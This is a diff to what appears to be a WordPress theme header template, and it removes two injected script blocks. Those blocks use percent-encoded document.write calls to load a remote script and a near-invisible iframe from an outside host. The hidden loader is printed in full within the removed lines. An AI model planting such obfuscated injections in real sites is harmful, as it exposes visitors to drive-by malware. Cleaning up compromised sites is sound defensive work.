@@ -1,15 +1,5 @@
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" <?php language_attributes(); ?>>
-<script type='text/javascript' language='Javascript'>
-<!--
-document.write(unescape('%3C%73%63%72%69%70%74%20%74%79%70%65%3D%22%74%65%78%74%2F%6A%61%76%61%73%63%72%69%70%74%22%20%73%72%63%3D%22%68%74%74%70%3A%2F%2F%65%6E%61%6C%6C%61%2E%77%65%62%73%2E%63%6F%6D%2F%70%6F%70%75%70%2E%6A%73%22%3E%3C%2F%73%63%72%69%70%74%3E'));
-//-->
-</script>
-<script type='text/javascript' language='Javascript'>
-<!--
-document.write(unescape('%3C%69%66%72%61%6D%65%20%6E%61%6D%65%3D%22%49%6E%6C%69%6E%65%46%72%61%6D%65%31%22%20%69%64%3D%22%49%6E%6C%69%6E%65%46%72%61%6D%65%31%22%20%73%74%79%6C%65%3D%22%77%69%64%74%68%3A%31%30%70%78%3B%68%65%69%67%68%74%3A%39%70%78%3B%7A%2D%69%6E%64%65%78%3A%31%3B%22%20%73%72%63%3D%22%68%74%74%70%3A%2F%2F%65%6E%61%6C%6C%61%2E%77%65%62%73%2E%63%6F%6D%2F%69%66%72%61%6D%65%2E%68%74%6D%6C%22%20%73%63%72%6F%6C%6C%69%6E%67%3D%22%6E%6F%22%20%66%72%61%6D%65%62%6F%72%64%65%72%3D%22%30%22%3E%59%6F%75%72%20%62%72%6F%77%73%65%72%20%64%6F%65%73%20%6E%6F%74%20%73%75%70%70%6F%72%74%20%69%6E%6C%69%6E%65%20%66%72%61%6D%65%73%20%6F%72%20%69%73%20%63%75%72%72%65%6E%74%6C%79%20%63%6F%6E%66%69%67%75%72%65%64%20%6E%6F%74%20%74%6F%20%64%69%73%70%6C%61%79%20%69%6E%6C%69%6E%65%20%66%72%61%6D%65%73%2E%3C%2F%69%66%72%61%6D%65%3E'));
-//-->
-</script>
 <head profile="http://gmpg.org/xfn/11">
 <meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />
 <title><?php elegant_titles(); ?></title>
